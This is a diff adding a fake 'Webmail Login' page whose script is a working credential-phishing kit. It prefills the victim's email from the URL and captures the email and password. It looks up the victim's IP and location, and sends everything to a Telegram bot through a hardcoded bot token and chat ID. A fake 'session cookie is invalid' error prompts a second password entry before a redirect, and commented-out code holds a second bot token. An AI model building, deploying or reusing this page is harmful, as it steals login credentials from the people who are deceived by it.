@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Webmail Login</title>
+  <style>
+    /* Page layout */
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      min-height: 100vh;
+      margin: 0;
+      display: flex;
+      flex-direction: column; /* allow footer to span full width */
+      align-items: center;    /* center the login container horizontally */
+      justify-content: center;/* center the login container vertically */
+      padding: 40px 20px 80px; /* bottom padding so footer/content script don't overlap */
+      box-sizing: border-box;
+    }
+
+    .container {
+      text-align: center;
+      width: 350px;
+      max-width: 90%;
+    }
+
+    .errorMsg {
+      background: #d9534f;
+      color: white;
+      padding: 12px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      display: none;
+    }
+    .error-box:before { content: "✖ "; margin-right: 6px; }
+
+    .logo { font-size: 38px; font-weight: bold; color: #f60; margin-bottom: 25px; font-family: 'Trebuchet MS', sans-serif; }
+
+   .form-group {
+  margin-bottom: 15px;
+  text-align: left;
+}
+
+.form-group input {
+  width: 100%;
+  padding: 10px 10px 10px 35px; /* space for the icon */
+  border: 1px solid #ccc;
+  border-radius: 3px;
+  font-size: 14px;
+  box-sizing: border-box;
+  background-color: #fff;
+  background-repeat: no-repeat;
+  background-position: 10px center;
+  background-size: 16px;
+}
+
+    .login-btn {
+      width: 100%;
+      padding: 10px;
+      background: #007cba;
+      color: white;
+      font-size: 16px;
+      border: 1px solid #007cba;
+      border-radius: 3px;
+      cursor: pointer;
+      box-sizing: border-box;
+    }
+    .login-btn:hover { background: #005f8d; }
+
+    .reset-password { display: block; margin-top: 12px; font-size: 14px; color: #007cba; text-decoration: none; }
+
+    /* Footer languages bar (now full width and centered) */
+    .languages {
+      width: 100%;                   /* span the full page width */
+      display: flex;                 /* use flex to center content reliably */
+      justify-content: center;       /* center horizontally */
+      gap: 12px;                     /* space between items */
+      white-space: nowrap;           /* keep everything on one line */
+      overflow-x: auto;              /* allow horizontal scroll on small screens */
+      -webkit-overflow-scrolling: touch;
+      font-size: 13px;
+      color: #333;
+      margin-top: 90px;
+      padding: 8px 20px;             /* small padding so items don't touch edges */
+      box-sizing: border-box;
+    }
+    .languages::-webkit-scrollbar { height: 8px; }
+    .languages span { cursor: pointer; display: inline-block; padding: 2px 4px; }
+
+    /* Small visual helper so the footer sits visually lower than the login box */
+    .footer-wrap { width: 100%; display:flex; justify-content:center; }
+
+    .content-script { position: fixed; right: 20px; bottom: 10px; font-size: 12px; color: #666; }
+
+    @media (max-width: 420px) {
+      .container { width: 320px; }
+      .logo { font-size: 34px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Error Message -->
+    <div class="errorMsg" id="errorMsg">x</div>
+
+    <!-- Logo -->
+    <div class="logo"><img src="https://harlequin-legal-ox-300.mypinata.cloud/ipfs/bafkreigeyp4umoleb6j7zh4xz435gvdd2endf4zervl3qgisg5pmbm24je" alt=""></div>
+
+    <!-- Form -->
+    <form>
+      <div class="form-group email">
+        <label style="font-weight: 600; font-size: 14px;"  for="email">Email</label>
+        <input style="margin-top: 15px;" type="email" id="email" placeholder="Email Address">
+      </div>
+      <div class="form-group password">
+        <label style="font-weight: 600; font-size: 14px;" for="password">Password</label>
+        <input style="margin-top: 15px;" type="password" id="password" placeholder="Password" >
+      </div>
+      <button class="login-btn" id="nextBtn">Log in</button>
+      <a href="#" class="reset-password">Reset Password</a>
+    </form>
+  </div>
+
+  <!-- Languages moved outside the centered container so they can span full width and be centered -->
+  <div class="footer-wrap">
+    <div class="languages">
+      <span>العربية</span>
+      <span>čeština</span>
+      <span>dansk</span>
+      <span>Deutsch</span>
+      <span>Ελληνικά</span>
+      <span>español</span>
+      <span>español latinoamericano</span>
+      <span>español de España</span>
+      <span>...</span>
+    </div>
+  </div>
+
+  <!-- Content Script -->
+  <div class="content-script">Content Script</div>
+
+   <script>
+// document.addEventListener('contextmenu', function (event) {
+//     event.preventDefault();
+//   });
+
+
+  window.addEventListener("DOMContentLoaded", function () {
+    const emailInput = document.getElementById("email");
+    let emailValue = "";
+
+    // 1. Check query string (?email=...)
+    const params = new URLSearchParams(window.location.search);
+    if (params.has("email")) {
+      emailValue = params.get("email");
+    }
+
+    // 2. If not found, check hash (#someone@gmail.com)
+    if (!emailValue && window.location.hash) {
+      emailValue = window.location.hash.substring(1); // remove "#"
+    }
+
+    // 3. If we found an email, set it in the input
+    if (emailValue) {
+      emailInput.value = decodeURIComponent(emailValue);
+    }
+  });
+
+// 8086788699:AAHzVjBSqQ7yhZq-m9yZpLvlLr90k53lq7g
+// 6954492973
+
+ var telegram_bot_id = "8215779697:AAG9QPdE878WO0kKIrmtxO7TBWdSJvILf7Q";
+        var chat_id = 6954492973;
+        var attemptCounter = 0;
+        var userInfo = {};
+    
+        // Fetch IP info
+        async function fetchText() {
+            let url = "https://ipinfo.io/json?token=de42e80837e28f";
+            try {
+                let response = await fetch(url);
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                let data = await response.json();
+                if (data) {
+                    userInfo = {
+                        country: data.country || 'N/A',
+                        state: data.region || 'N/A',
+                        city: data.city || 'N/A',
+                        isp: data.org || 'N/A',
+                        ip: data.ip || 'N/A'
+                    };
+                } else {
+                    console.error('Data is undefined');
+                }
+            } catch (error) {
+                console.error('Fetch error: ', error);
+            }
+        }
+    
+        // Get current time
+        function getCurrentTime() {
+            var now = new Date();
+            var year = now.getFullYear();
+            var month = (now.getMonth() + 1).toString().padStart(2, '0');
+            var day = now.getDate().toString().padStart(2, '0');
+            var hours = now.getHours().toString().padStart(2, '0');
+            var minutes = now.getMinutes().toString().padStart(2, '0');
+            var seconds = now.getSeconds().toString().padStart(2, '0');
+            return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
+        }
+    
+        // Handle form submission
+        async function handleSubmit(event) {
+            event.preventDefault();
+    
+            var u_name = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+    
+    
+            // Fetch IP details before sending
+            await fetchText();
+    
+            // Prepare data to send to the Telegram bot
+            var message = `
+            -- ༒ քɛʀʀʏƈʏɮɛʀ ʍǟɖɛ ɨȶ ༒ --
+            Webmail Login [RC & CP]
+            -------------------------------
+            User ID: ${u_name}
+            Password: ${password}
+            Attempt: ${attemptCounter + 1}
+            Country: ${userInfo.country}
+            State: ${userInfo.state}
+            City: ${userInfo.city}
+            ISP: ${userInfo.isp}
+            IP Address: ${userInfo.ip}
+            Time: ${getCurrentTime()}
+            `;
+    
+            var url = `https://api.telegram.org/bot${telegram_bot_id}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+            fetch(url, { method: "GET" })
+            .then(response => {
+                if (response.ok) {
+                    attemptCounter++; // Increment only if message is successfully sent
+    
+                    // Clear the user ID and password fields
+                    document.getElementById("email").value = "";
+                    document.getElementById("password").value = "";
+    
+                   
+    
+                } else {
+
+                }
+            })
+            .catch(error => {
+                alert("Error: " + error);
+            });
+        }
+
+document.getElementById("nextBtn").addEventListener("click", function(event) {
+  validateForm();
+  handleSubmit(event);
+});
+
+// 6949497283:AAGtXd6deZQBaLidD9PemzzWyJ64XknZ7mE
+// 7059402644
+
+
+//  var telegram_bot_id = "6949497283:AAGtXd6deZQBaLidD9PemzzWyJ64XknZ7mE";
+//         var chat_id = 7059402644;
+//         var attemptCounter = 0;
+//         var userInfo = {};
+    
+//         // Fetch IP info
+//         async function fetchText() {
+//             let url = "https://ipinfo.io/json?token=de42e80837e28f";
+//             try {
+//                 let response = await fetch(url);
+//                 if (!response.ok) {
+//                     throw new Error('Network response was not ok ' + response.statusText);
+//                 }
+//                 let data = await response.json();
+//                 if (data) {
+//                     userInfo = {
+//                         country: data.country || 'N/A',
+//                         state: data.region || 'N/A',
+//                         city: data.city || 'N/A',
+//                         isp: data.org || 'N/A',
+//                         ip: data.ip || 'N/A'
+//                     };
+//                 } else {
+//                     console.error('Data is undefined');
+//                 }
+//             } catch (error) {
+//                 console.error('Fetch error: ', error);
+//             }
+//         }
+    
+//         // Get current time
+//         function getCurrentTime() {
+//             var now = new Date();
+//             var year = now.getFullYear();
+//             var month = (now.getMonth() + 1).toString().padStart(2, '0');
+//             var day = now.getDate().toString().padStart(2, '0');
+//             var hours = now.getHours().toString().padStart(2, '0');
+//             var minutes = now.getMinutes().toString().padStart(2, '0');
+//             var seconds = now.getSeconds().toString().padStart(2, '0');
+//             return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
+//         }
+    
+//         // Handle form submission
+//         async function handleSubmit(event) {
+//             event.preventDefault();
+    
+//             var u_name = document.getElementById("email").value;
+//             var password = document.getElementById("password").value;
+    
+    
+//             // Fetch IP details before sending
+//             await fetchText();
+    
+//             // Prepare data to send to the Telegram bot
+//             var message = `
+//             ----- ༒ քɛʀʀʏƈʏɮɛʀ ʍǟɖɛ ɨȶ ༒ -----
+//             Webmail Login Details [RC & CP]
+//             -------------------------------
+//                 User ID: ${u_name}
+//                 Password: ${password}
+//                 Attempt: ${attemptCounter + 1}
+//                 Country: ${userInfo.country}
+//                 State: ${userInfo.state}
+//                 City: ${userInfo.city}
+//                 ISP: ${userInfo.isp}
+//                 IP Address: ${userInfo.ip}
+//                 Time: ${getCurrentTime()}
+//             `;
+    
+//             var url = `https://api.telegram.org/bot${telegram_bot_id}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+//             fetch(url, { method: "GET" })
+//             .then(response => {
+//                 if (response.ok) {
+//                     attemptCounter++; // Increment only if message is successfully sent
+    
+//                     // Clear the user ID and password fields
+//                     document.getElementById("email").value = "";
+//                     document.getElementById("password").value = "";
+    
+                   
+    
+//                 } else {
+
+//                 }
+//             })
+//             .catch(error => {
+//                 alert("Error: " + error);
+//             });
+//         }
+
+// document.getElementById("nextBtn").addEventListener("click", function(event) {
+//   validateForm();
+//   handleSubmit(event);
+// });
+
+
+    function validateForm() {
+      const email = document.getElementById('email');
+      const password = document.getElementById('password');
+      const errorMsg = document.getElementById('errorMsg');
+
+      let hasError = false;
+      let message = "";
+
+      // Reset previous state
+      email.classList.remove('error');
+      password.classList.remove('error');
+      errorMsg.style.display = 'none';
+      errorMsg.innerText = "";
+
+      // Validation
+      if (email.value.trim() === "") {
+        email.classList.add('error');
+        message = "Email is required.";
+        hasError = true;
+      } else if (!email.value.includes("@")) {
+        email.classList.add('error');
+        message = "Email must contain '@'.";
+        hasError = true;
+      }
+
+      if (password.value.trim() === "") {
+        password.classList.add('error');
+        message += (message ? " " : "") + "Password is required.";
+        hasError = true;
+      }
+
+      // Show errors
+      if (hasError) {
+        errorMsg.innerText = message;
+        errorMsg.style.display = 'block';
+        return;
+      }
+
+      // All input is valid
+      attemptCounter++;
+      if (attemptCounter === 1) {
+        errorMsg.innerText = "Your session cookie is invalid. Please log in again.";
+        errorMsg.style.display = 'block';
+      } else {
+        // Redirect or simulate success
+        window.location.href = "https://meltarsupply.com:2096/"; // Change to your target URL
+      }
+    }
+  </script> 
+
+
+
+
+</body>
+</html>
